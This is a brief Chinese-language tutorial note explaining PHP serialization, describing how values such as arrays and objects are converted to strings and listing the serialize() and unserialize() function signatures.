序列化

在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。大概就是将数组和类的值转换成字符串来传值。

序列化

  • serialize ( mixed $value )

反序列化

  • unserialize ( mixed $value )
